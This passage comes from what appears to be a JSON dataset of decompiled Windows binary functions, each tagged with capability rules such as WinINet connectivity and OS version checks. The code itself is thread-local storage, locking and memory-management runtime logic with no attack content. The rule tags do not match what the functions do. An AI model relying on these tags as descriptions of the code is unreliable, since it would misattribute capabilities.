    goto code_r0x00014000cc1c;\n                    }\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    **(iVar4 + 0x70) = **(iVar4 + 0x70) + -1;\n                    if (iVar6 != 0) goto code_r0x00014000cc20;\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) == 0) goto code_r0x00014000cc2b;\n                    if (iVar6 != 0) goto code_r0x00014000cea0;\n                    iVar6 = fcn.1400113f0();\n                    if (**(iVar6 + 0x70) != 0) break;\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) goto code_r0x00014000cc40;\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x68) != 0) {\n                        if (iVar6 == 0) {\n                            iVar6 = fcn.1400113f0();\n                        }\n                        goto code_r0x00014000cc4b;\n                    }\ncode_r0x00014000cfeb:\n                    *(iVar6 + 0x68) = 0x1400ee078;\n                    puVar9 = 0x1400ee078;\n                }\n                sub.msvcrt.dll_free(*puVar9);\n                iVar6 = *piVar1;\n                if (iVar6 == 0) {\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x78) == 0) goto code_r0x00014000cfdb;\n                    if (iVar6 != 0) goto code_r0x00014000cc6f;\n                    iVar6 = fcn.1400113f0();\n                    puVar9 = *(iVar6 + 0x78);\n                    iVar6 = *piVar1;\n                    *puVar9 = 0;\n                    if (iVar6 != 0) goto code_r0x00014000cc7a;\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) != 0) {\n                        if (iVar6 == 0) {\n                            iVar6 = fcn.1400113f0();\n                        }\n                        goto code_r0x00014000cc85;\n                    }\ncode_r0x00014000cfc8:\n                    *(iVar6 + 0x70) = 0x1400ee070;\n                    puVar10 = 0x1400ee070;\n                }\n                else {\n                    if (*(iVar6 + 0x78) == 0) {\ncode_r0x00014000cfdb:\n                        puVar9 = 0x1400ee068;\n                        *(iVar6 + 0x78) = 0x1400ee068;\n                    }\n                    else {\ncode_r0x00014000cc6f:\n                        puVar9 = *(iVar6 + 0x78);\n                    }\n                    *puVar9 = 0;\ncode_r0x00014000cc7a:\n                    if (*(iVar6 + 0x70) == 0) goto code_r0x00014000cfc8;\ncode_r0x00014000cc85:\n                    puVar10 = *(iVar6 + 0x70);\n                }\n                *puVar10 = *puVar9;\n                break;\n            }\n            if (iVar6 == 0) {\n                iVar4 = fcn.1400113f0();\n                iVar6 = *piVar1;\n                if (*(iVar4 + 0x68) != 0) {\n                    if (iVar6 == 0) {\n                        iVar6 = fcn.1400113f0();\n                    }\n                    goto code_r0x00014000ca3e;\n                }\ncode_r0x00014000ca88:\n                *(iVar6 + 0x68) = 0x1400ee078;\n                piVar8 = 0x1400ee078;\n            }\n            else {\n                if (*(iVar6 + 0x68) == 0) goto code_r0x00014000ca88;\ncode_r0x00014000ca3e:\n                piVar8 = *(iVar6 + 0x68);\n            }\n            if (uVar7 < *(*piVar8 + 8 + uVar11 * 0x10)) {\n                if (uVar11 == uVar13) break;\n                uVar15 = uVar11 - 1;\n            }\n            else {\n                uVar13 = uVar11 + 1;\n            }\n            if (uVar15 < uVar13) break;\n            iVar6 = *piVar1;\n        } while( true );\n    }\ncode_r0x00014000c7b2:\n    if (arg1[10] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    if (arg1[0xb] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    if (arg1[0xc] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    *arg1 = 0;\n    arg1[0x3b] = 0;\n    puVar9 = arg1 + 1 & 0xfffffffffffffff8;\n    for (uVar7 = (arg1 - (arg1 + 1 & 0xfffffffffffffff8)) + 0x1e0U >> 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x00014000c822;\n        if (iVar6 != 0) goto code_r0x00014000c8e0;\n        iVar6 = fcn.1400113f0();\n        if (**(iVar6 + 0x58) == 0) {\n            iVar6 = *piVar1;\n            if (iVar6 != 0) goto code_r0x00014000c8ee;\n            iVar4 = fcn.1400113f0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x58) == 0) goto code_r0x00014000c8f9;\n            if (iVar6 != 0) goto code_r0x00014000ca68;\n            iVar6 = fcn.1400113f0();\n            puVar9 = *(iVar6 + 0x58);\n            iVar6 = *piVar1;\n            *puVar9 = arg1;\n            if (iVar6 != 0) goto code_r0x00014000c907;\n            iVar6 = fcn.1400113f0();\n            iVar4 = *(iVar6 + 0x50);\n            iVar6 = *piVar1;\n            goto code_r0x00014000c90f;\n        }\n        iVar6 = *piVar1;\n        if (iVar6 != 0) goto code_r0x00014000c837;\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x00014000c842;\n        if (iVar6 != 0) goto code_r0x00014000c950;\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar1;\n        *(**(iVar4 + 0x58) + 0x1d0) = arg1;\n        if (iVar6 != 0) goto code_r0x00014000c857;\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x00014000c970;\n        if (iVar6 != 0) goto code_r0x00014000c862;\n        iVar6 = fcn.1400113f0();\n        puVar9 = *(iVar6 + 0x58);\n        iVar6 = *piVar1;\n    }\n    else {\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x00014000c822:\n            *(iVar6 + 0x58) = 0x1400ee080;\n            iVar4 = *0x1400ee080;\n        }\n        else {\ncode_r0x00014000c8e0:\n            iVar4 = **(iVar6 + 0x58);\n        }\n        if (iVar4 == 0) {\ncode_r0x00014000c8ee:\n            if (*(iVar6 + 0x58) == 0) {\ncode_r0x00014000c8f9:\n                puVar9 = 0x1400ee080;\n                *(iVar6 + 0x58) = 0x1400ee080;\n            }\n            else {\ncode_r0x00014000ca68:\n                puVar9 = *(iVar6 + 0x58);\n            }\n            *puVar9 = arg1;\ncode_r0x00014000c907:\n            iVar4 = *(iVar6 + 0x50);\ncode_r0x00014000c90f:\n            if (iVar4 == 0) {\n                puVar10 = 0x1400ee088;\n                *(iVar6 + 0x50) = 0x1400ee088;\n            }\n            else if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n                puVar10 = *(iVar6 + 0x50);\n                iVar6 = *piVar1;\n            }\n            else {\n                puVar10 = *(iVar6 + 0x50);\n            }\n            *puVar10 = *puVar9;\n            goto joined_r0x00014000c86c;\n        }\ncode_r0x00014000c837:\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x00014000c842:\n            piVar8 = 0x1400ee080;\n            *(iVar6 + 0x58) = 0x1400ee080;\n        }\n        else {\ncode_r0x00014000c950:\n            piVar8 = *(iVar6 + 0x58);\n        }\n        *(*piVar8 + 0x1d0) = arg1;\ncode_r0x00014000c857:\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x00014000c970:\n            puVar9 = 0x1400ee080;\n            *(iVar6 + 0x58) = 0x1400ee080;\n        }\n        else {\ncode_r0x00014000c862:\n            puVar9 = *(iVar6 + 0x58);\n        }\n    }\n    *puVar9 = arg1;\njoined_r0x00014000c86c:\n    if (iVar6 == 0) {\n        iVar6 = fcn.1400113f0();\n        iVar4 = *(iVar6 + 0x60);\n        iVar6 = *piVar1;\n    }\n    else {\n        iVar4 = *(iVar6 + 0x60);\n    }\n    if (iVar4 == 0) {\n        arg1_01 = 0x14001b0b8;\n        *(iVar6 + 0x60) = 0x14001b0b8;\n    }\n    else {\n        if (iVar6 == 0) {\n            iVar6 = fcn.1400113f0();\n        }\n        arg1_01 = *(iVar6 + 0x60);\n    }\n    arg2 = *arg1_01;\n    if (arg2 + 3U < 4) {\n        arg2 = fcn.1400119a0(arg1_01, arg2);\n    }\n    if (arg2 == NULL) {\n        return 0xc;\n    }\n    if (arg2[1] != 0) {\n        if (*arg2 == 0) {\n            return 0x16;\n        }\n        iVar3 = arg2[5];\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar3 != iVar2) {\n            return true;\n        }\n        if (arg2[4] != 0) {\n            arg2[4] = arg2[4] + -1;\n            return false;\n        }\n        arg2[5] = -1;\n    }\n    iVar3 = *arg2;\n    *arg2 = 0;\n    bVar16 = false;\n    if (iVar3 == 2) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(arg2 + 2));\n        bVar16 = iVar3 == 0;\n    }\n    return bVar16;\n}\n",
        "token_count": 5799
    },
    "14000d0b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.14000d0b0(ulong *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t in_RAX;\n    int32_t *arg2;\n    ulong arg1_00;\n    uint64_t uVar7;\n    int32_t **arg1_01;\n    int64_t *piVar8;\n    ulong *puVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    \n    piVar1 = *0x1400d7110;\n    if ((arg1 == NULL) || (arg1[0x3a] != 0)) {\n        return in_RAX;\n    }\n    iVar6 = **0x1400d7110;\n    if (iVar6 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x60) == 0) goto code_r0x00014000c792;\n        if (iVar6 == 0) {\n            iVar6 = fcn.1400113f0();\n        }\ncode_r0x00014000c8d0:\n        arg1_00 = *(iVar6 + 0x60);\n    }\n    else {\n        if (*(iVar6 + 0x60) != 0) goto code_r0x00014000c8d0;\ncode_r0x00014000c792:\n        arg1_00 = 0x14001b0b8;\n        *(iVar6 + 0x60) = 0x14001b0b8;\n    }\n    fcn.140011a20(arg1_00);\n    uVar7 = arg1[0x3b];\n    if (uVar7 != 0) {\n        iVar6 = *piVar1;\n        if (iVar6 == 0) {\n            iVar4 = fcn.1400113f0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x70) == 0) goto code_r0x00014000c998;\n            if (iVar6 != 0) goto code_r0x00014000ca58;\n            iVar6 = fcn.1400113f0();\n            if (**(iVar6 + 0x70) == 0) goto code_r0x00014000c7b2;\n            iVar6 = *piVar1;\n            if (iVar6 != 0) goto code_r0x00014000c9b4;\n            iVar4 = fcn.1400113f0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x70) == 0) goto code_r0x00014000cbb0;\n            if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n                piVar8 = *(iVar6 + 0x70);\n                iVar6 = *piVar1;\n                goto code_r0x00014000c9c3;\n            }\n        }\n        else {\n            if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000c998:\n                *(iVar6 + 0x70) = 0x1400ee070;\n                piVar8 = 0x1400ee070;\n            }\n            else {\ncode_r0x00014000ca58:\n                piVar8 = *(iVar6 + 0x70);\n            }\n            if (*piVar8 == 0) goto code_r0x00014000c7b2;\n            iVar6 = *piVar1;\ncode_r0x00014000c9b4:\n            if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000cbb0:\n                piVar8 = 0x1400ee070;\n                *(iVar6 + 0x70) = 0x1400ee070;\n                goto code_r0x00014000c9c3;\n            }\n        }\n        piVar8 = *(iVar6 + 0x70);\ncode_r0x00014000c9c3:\n        uVar13 = 0;\n        uVar15 = *piVar8 - 1;\n        do {\n            uVar11 = uVar13 + uVar15 >> 1;\n            if (iVar6 == 0) {\n                iVar4 = fcn.1400113f0();\n                iVar6 = *piVar1;\n                if (*(iVar4 + 0x68) != 0) {\n                    if (iVar6 == 0) {\n                        iVar6 = fcn.1400113f0();\n                    }\n                    goto code_r0x00014000ca11;\n                }\ncode_r0x00014000ca78:\n                *(iVar6 + 0x68) = 0x1400ee078;\n                piVar8 = 0x1400ee078;\n            }\n            else {\n                if (*(iVar6 + 0x68) == 0) goto code_r0x00014000ca78;\ncode_r0x00014000ca11:\n                piVar8 = *(iVar6 + 0x68);\n                iVar6 = *piVar1;\n            }\n            if (uVar7 == *(*piVar8 + 8 + uVar11 * 0x10)) {\n                if (iVar6 == 0) {\n                    iVar6 = fcn.1400113f0();\n                    if (*(iVar6 + 0x68) == 0) {\n                        iVar6 = *piVar1;\n                        goto code_r0x00014000cbd4;\n                    }\ncode_r0x00014000cc98:\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) goto code_r0x00014000cbe3;\n                    fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    uVar7 = uVar11 + 1;\n                    if (iVar6 != 0) goto code_r0x00014000cbe3;\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) == 0) goto code_r0x00014000cbee;\n                    if (iVar6 != 0) goto code_r0x00014000ceb0;\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (uVar7 <= **(iVar4 + 0x70) && **(iVar4 + 0x70) != uVar7) {\n                        iVar4 = uVar7 * 0x10;\n                        if (iVar6 != 0) goto code_r0x00014000cebd;\n                        iVar12 = fcn.1400113f0();\n                        iVar6 = *piVar1;\n                        if (*(iVar12 + 0x70) == 0) goto code_r0x00014000cec4;\n                        if (iVar6 != 0) goto code_r0x00014000cf32;\n                        iVar12 = fcn.1400113f0();\n                        iVar6 = *piVar1;\n                        iVar12 = (**(iVar12 + 0x70) - uVar7) * 0x10;\n                        if (iVar6 != 0) goto code_r0x00014000ced9;\n                        iVar14 = fcn.1400113f0();\n                        iVar6 = *piVar1;\n                        if (*(iVar14 + 0x68) == 0) goto code_r0x00014000cfb8;\n                        if (iVar6 != 0) goto code_r0x00014000cee4;\n                        iVar14 = fcn.1400113f0();\n                        iVar6 = *piVar1;\n                        iVar14 = **(iVar14 + 0x68) + iVar4;\n                        if (iVar6 == 0) {\n                            iVar5 = fcn.1400113f0();\n                            iVar6 = *piVar1;\n                            if (*(iVar5 + 0x68) == 0) goto code_r0x00014000d009;\n                            if (iVar6 == 0) {\n                                iVar6 = fcn.1400113f0();\n                            }\n                            goto code_r0x00014000cef5;\n                        }\n                        if (*(iVar6 + 0x68) != 0) goto code_r0x00014000cef5;\ncode_r0x00014000d009:\n                        *(iVar6 + 0x68) = 0x1400ee078;\n                        piVar8 = 0x1400ee078;\n                        goto code_r0x00014000cef9;\n                    }\ncode_r0x00014000cf10:\n                    if (iVar6 != 0) goto code_r0x00014000cc06;\n                    iVar6 = fcn.1400113f0();\n                    if (*(iVar6 + 0x70) != 0) goto code_r0x00014000cda0;\n                    iVar6 = *piVar1;\ncode_r0x00014000cc11:\n                    piVar8 = 0x1400ee070;\n                    *(iVar6 + 0x70) = 0x1400ee070;\ncode_r0x00014000cc1c:\n                    *piVar8 = *piVar8 + -1;\ncode_r0x00014000cc20:\n                    if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000cc2b:\n                        piVar8 = 0x1400ee070;\n                        *(iVar6 + 0x70) = 0x1400ee070;\n                    }\n                    else {\ncode_r0x00014000cea0:\n                        piVar8 = *(iVar6 + 0x70);\n                    }\n                    if (*piVar8 != 0) break;\ncode_r0x00014000cc40:\n                    if (*(iVar6 + 0x68) == 0) goto code_r0x00014000cfeb;\ncode_r0x00014000cc4b:\n                    puVar9 = *(iVar6 + 0x68);\n                }\n                else {\n                    if (*(iVar6 + 0x68) != 0) goto code_r0x00014000cc98;\ncode_r0x00014000cbd4:\n                    *(iVar6 + 0x68) = 0x1400ee078;\ncode_r0x00014000cbe3:\n                    if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000cbee:\n                        uVar7 = *0x1400ee070;\n                        *(iVar6 + 0x70) = 0x1400ee070;\n                        if (uVar11 + 1 < uVar7) {\ncode_r0x00014000cf32:\n                            piVar8 = *(iVar6 + 0x70);\n                            goto code_r0x00014000cecf;\n                        }\n                    }\n                    else {\ncode_r0x00014000ceb0:\n                        if (uVar11 + 1 < **(iVar6 + 0x70)) {\ncode_r0x00014000cebd:\n                            if (*(iVar6 + 0x70) != 0) goto code_r0x00014000cf32;\ncode_r0x00014000cec4:\n                            piVar8 = 0x1400ee070;\n                            *(iVar6 + 0x70) = 0x1400ee070;\ncode_r0x00014000cecf:\n                            iVar12 = (*piVar8 - (uVar11 + 1)) * 0x10;\ncode_r0x00014000ced9:\n                            if (*(iVar6 + 0x68) == 0) {\ncode_r0x00014000cfb8:\n                                piVar8 = 0x1400ee078;\n                                *(iVar6 + 0x68) = 0x1400ee078;\n                            }\n                            else {\ncode_r0x00014000cee4:\n                                piVar8 = *(iVar6 + 0x68);\n                            }\n                            iVar4 = (uVar11 + 1) * 0x10;\n                            iVar14 = *piVar8 + iVar4;\ncode_r0x00014000cef5:\n                            piVar8 = *(iVar6 + 0x68);\ncode_r0x00014000cef9:\n                            sub.msvcrt.dll_memmove(*piVar8 + -0x10 + iVar4, iVar14, iVar12);\n                            iVar6 = *piVar1;\n                            goto code_r0x00014000cf10;\n                        }\n                    }\ncode_r0x00014000cc06:\n                    if (*(iVar6 + 0x70) == 0) goto code_r0x00014000cc11;\ncode_r0x00014000cda0:\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) {\n                        piVar8 = *(iVar6 + 0x70);\n                        goto code_r0x00014000cc1c;\n                    }\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    **(iVar4 + 0x70) = **(iVar4 + 0x70) + -1;\n                    if (iVar6 != 0) goto code_r0x00014000cc20;\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) == 0) goto code_r0x00014000cc2b;\n                    if (iVar6 != 0) goto code_r0x00014000cea0;\n                    iVar6 = fcn.1400113f0();\n                    if (**(iVar6 + 0x70) != 0) break;\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) goto code_r0x00014000cc40;\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x68) != 0) {\n                        if (iVar6 == 0) {\n                            iVar6 = fcn.1400113f0();\n                        }\n                        goto code_r0x00014000cc4b;\n                    }\ncode_r0x00014000cfeb:\n                    *(iVar6 + 0x68) = 0x1400ee078;\n                    puVar9 = 0x1400ee078;\n                }\n                sub.msvcrt.dll_free(*puVar9);\n                iVar6 = *piVar1;\n                if (iVar6 == 0) {\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x78) == 0) goto code_r0x00014000cfdb;\n                    if (iVar6 != 0) goto code_r0x00014000cc6f;\n                    iVar6 = fcn.1400113f0();\n                    puVar9 = *(iVar6 + 0x78);\n                    iVar6 = *piVar1;\n                    *puVar9 = 0;\n                    if (iVar6 != 0) goto code_r0x00014000cc7a;\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) != 0) {\n                        if (iVar6 == 0) {\n                            iVar6 = fcn.1400113f0();\n                        }\n                        goto code_r0x00014000cc85;\n                    }\ncode_r0x00014000cfc8:\n                    *(iVar6 + 0x70) = 0x1400ee070;\n                    puVar10 = 0x1400ee070;\n                }\n                else {\n                    if (*(iVar6 + 0x78) == 0) {\ncode_r0x00014000cfdb:\n                        puVar9 = 0x1400ee068;\n                        *(iVar6 + 0x78) = 0x1400ee068;\n                    }\n                    else {\ncode_r0x00014000cc6f:\n                        puVar9 = *(iVar6 + 0x78);\n                    }\n                    *puVar9 = 0;\ncode_r0x00014000cc7a:\n                    if (*(iVar6 + 0x70) == 0) goto code_r0x00014000cfc8;\ncode_r0x00014000cc85:\n                    puVar10 = *(iVar6 + 0x70);\n                }\n                *puVar10 = *puVar9;\n                break;\n            }\n            if (iVar6 == 0) {\n                iVar4 = fcn.1400113f0();\n                iVar6 = *piVar1;\n                if (*(iVar4 + 0x68) != 0) {\n                    if (iVar6 == 0) {\n                        iVar6 = fcn.1400113f0();\n                    }\n                    goto code_r0x00014000ca3e;\n                }\ncode_r0x00014000ca88:\n                *(iVar6 + 0x68) = 0x1400ee078;\n                piVar8 = 0x1400ee078;\n            }\n            else {\n                if (*(iVar6 + 0x68) == 0) goto code_r0x00014000ca88;\ncode_r0x00014000ca3e:\n                piVar8 = *(iVar6 + 0x68);\n            }\n            if (uVar7 < *(*piVar8 + 8 + uVar11 * 0x10)) {\n                if (uVar11 == uVar13) break;\n                uVar15 = uVar11 - 1;\n            }\n            else {\n                uVar13 = uVar11 + 1;\n            }\n            if (uVar15 < uVar13) break;\n            iVar6 = *piVar1;\n        } while( true );\n    }\ncode_r0x00014000c7b2:\n    if (arg1[10] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    if (arg1[0xb] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    if (arg1[0xc] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    *arg1 = 0;\n    arg1[0x3b] = 0;\n    puVar9 = arg1 + 1 & 0xfffffffffffffff8;\n    for (uVar7 = (arg1 - (arg1 + 1 & 0xfffffffffffffff8)) + 0x1e0U >> 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x00014000c822;\n        if (iVar6 != 0) goto code_r0x00014000c8e0;\n        iVar6 = fcn.1400113f0();\n        if (**(iVar6 + 0x58) == 0) {\n            iVar6 = *piVar1;\n            if (iVar6 != 0) goto code_r0x00014000c8ee;\n            iVar4 = fcn.1400113f0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x58) == 0) goto code_r0x00014000c8f9;\n            if (iVar6 != 0) goto code_r0x00014000ca68;\n            iVar6 = fcn.1400113f0();\n            puVar9 = *(iVar6 + 0x58);\n            iVar6 = *piVar1;\n            *puVar9 = arg1;\n            if (iVar6 != 0) goto code_r0x00014000c907;\n            iVar6 = fcn.1400113f0();\n            iVar4 = *(iVar6 + 0x50);\n            iVar6 = *piVar1;\n            goto code_r0x00014000c90f;\n        }\n        iVar6 = *piVar1;\n        if (iVar6 != 0) goto code_r0x00014000c837;\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x00014000c842;\n        if (iVar6 != 0) goto code_r0x00014000c950;\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar1;\n        *(**(iVar4 + 0x58) + 0x1d0) = arg1;\n        if (iVar6 != 0) goto code_r0x00014000c857;\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x00014000c970;\n        if (iVar6 != 0) goto code_r0x00014000c862;\n        iVar6 = fcn.1400113f0();\n        puVar9 = *(iVar6 + 0x58);\n        iVar6 = *piVar1;\n    }\n    else {\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x00014000c822:\n            *(iVar6 + 0x58) = 0x1400ee080;\n            iVar4 = *0x1400ee080;\n        }\n        else {\ncode_r0x00014000c8e0:\n            iVar4 = **(iVar6 + 0x58);\n        }\n        if (iVar4 == 0) {\ncode_r0x00014000c8ee:\n            if (*(iVar6 + 0x58) == 0) {\ncode_r0x00014000c8f9:\n                puVar9 = 0x1400ee080;\n                *(iVar6 + 0x58) = 0x1400ee080;\n            }\n            else {\ncode_r0x00014000ca68:\n                puVar9 = *(iVar6 + 0x58);\n            }\n            *puVar9 = arg1;\ncode_r0x00014000c907:\n            iVar4 = *(iVar6 + 0x50);\ncode_r0x00014000c90f:\n            if (iVar4 == 0) {\n                puVar10 = 0x1400ee088;\n                *(iVar6 + 0x50) = 0x1400ee088;\n            }\n            else if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n                puVar10 = *(iVar6 + 0x50);\n                iVar6 = *piVar1;\n            }\n            else {\n                puVar10 = *(iVar6 + 0x50);\n            }\n            *puVar10 = *puVar9;\n            goto joined_r0x00014000c86c;\n        }\ncode_r0x00014000c837:\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x00014000c842:\n            piVar8 = 0x1400ee080;\n            *(iVar6 + 0x58) = 0x1400ee080;\n        }\n        else {\ncode_r0x00014000c950:\n            piVar8 = *(iVar6 + 0x58);\n        }\n        *(*piVar8 + 0x1d0) = arg1;\ncode_r0x00014000c857:\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x00014000c970:\n            puVar9 = 0x1400ee080;\n            *(iVar6 + 0x58) = 0x1400ee080;\n        }\n        else {\ncode_r0x00014000c862:\n            puVar9 = *(iVar6 + 0x58);\n        }\n    }\n    *puVar9 = arg1;\njoined_r0x00014000c86c:\n    if (iVar6 == 0) {\n        iVar6 = fcn.1400113f0();\n        iVar4 = *(iVar6 + 0x60);\n        iVar6 = *piVar1;\n    }\n    else {\n        iVar4 = *(iVar6 + 0x60);\n    }\n    if (iVar4 == 0) {\n        arg1_01 = 0x14001b0b8;\n        *(iVar6 + 0x60) = 0x14001b0b8;\n    }\n    else {\n        if (iVar6 == 0) {\n            iVar6 = fcn.1400113f0();\n        }\n        arg1_01 = *(iVar6 + 0x60);\n    }\n    arg2 = *arg1_01;\n    if (arg2 + 3U < 4) {\n        arg2 = fcn.1400119a0(arg1_01, arg2);\n    }\n    if (arg2 == NULL) {\n        return 0xc;\n    }\n    if (arg2[1] != 0) {\n        if (*arg2 == 0) {\n            return 0x16;\n        }\n        iVar3 = arg2[5];\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar3 != iVar2) {\n            return 1;\n        }\n        if (arg2[4] != 0) {\n            arg2[4] = arg2[4] + -1;\n            return 0;\n        }\n        arg2[5] = -1;\n    }\n    iVar3 = *arg2;\n    *arg2 = 0;\n    uVar7 = 0;\n    if (iVar3 == 2) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(arg2 + 2));\n        uVar7 = iVar3 == 0;\n    }\n    return uVar7;\n}\n",
        "token_count": 5839
    },
    "14000d0d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.14000d0d0(void)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    ulong uVar8;\n    ulong uVar9;\n    uint *puVar10;\n    int64_t iVar11;\n    int32_t *arg1;\n    \n    piVar1 = *0x1400d7110;\n    iVar5 = **0x1400d7110;\n    if (iVar5 == 0) {\n        iVar6 = fcn.1400113f0();\n        iVar5 = *piVar1;\n        if (*(iVar6 + 0x28) == 0) goto code_r0x00014000d0f8;\n        if (iVar5 != 0) goto code_r0x00014000d2a8;\n        iVar5 = fcn.1400113f0();\n        arg1 = *(iVar5 + 0x28);\n        if (*arg1 != 1) goto code_r0x00014000d10c;\ncode_r0x00014000d111:\n        iVar5 = *piVar1;\n        if (iVar5 != 0) goto code_r0x00014000d119;\n        iVar6 = fcn.1400113f0();\n        iVar5 = *piVar1;\n        if (*(iVar6 + 0x30) == 0) goto code_r0x00014000d120;\n        if (iVar5 == 0) {\n            iVar5 = fcn.1400113f0();\n        }\ncode_r0x00014000d170:\n        iVar5 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(**(iVar5 + 0x30));\n    }\n    else {\n        if (*(iVar5 + 0x28) == 0) {\ncode_r0x00014000d0f8:\n            iVar4 = *0x1400ee098;\n            arg1 = 0x1400ee098;\n            *(iVar5 + 0x28) = 0x1400ee098;\n        }\n        else {\ncode_r0x00014000d2a8:\n            arg1 = *(iVar5 + 0x28);\n            iVar4 = *arg1;\n        }\n        if (iVar4 != 1) {\ncode_r0x00014000d10c:\n            fcn.14000c6e0(arg1);\n            goto code_r0x00014000d111;\n        }\n        iVar5 = *piVar1;\ncode_r0x00014000d119:\n        if (*(iVar5 + 0x30) != 0) goto code_r0x00014000d170;\ncode_r0x00014000d120:\n        *(iVar5 + 0x30) = 0x14001b0c8;\n        iVar5 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*0x14001b0c8);\n    }\n    if (((iVar5 != 0) || (iVar6 = fcn.14000c220(),  *0x1400f1050 == 0)) || (iVar6 == 0)) {\n        return iVar5;\n    }\n    *(iVar6 + 0x44) = 1;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *(iVar6 + 0x70) = uVar3;\n    uVar7 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n    *(iVar6 + 0x38) = 0xffffffffffffffff;\n    *(iVar6 + 0x30) = uVar7;\n    iVar4 = fcn.140013290(iVar6 + 0x68);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n    if (iVar4 == 1) {\n        fcn.14000c5b0();\n        *(**0x1400d7110 + 0x10) = 0x1400ee0a8;\n        return 0x1400ee0a8;\n    }\n    *(iVar6 + 0x68) = 0xffffffffffffffff;\n    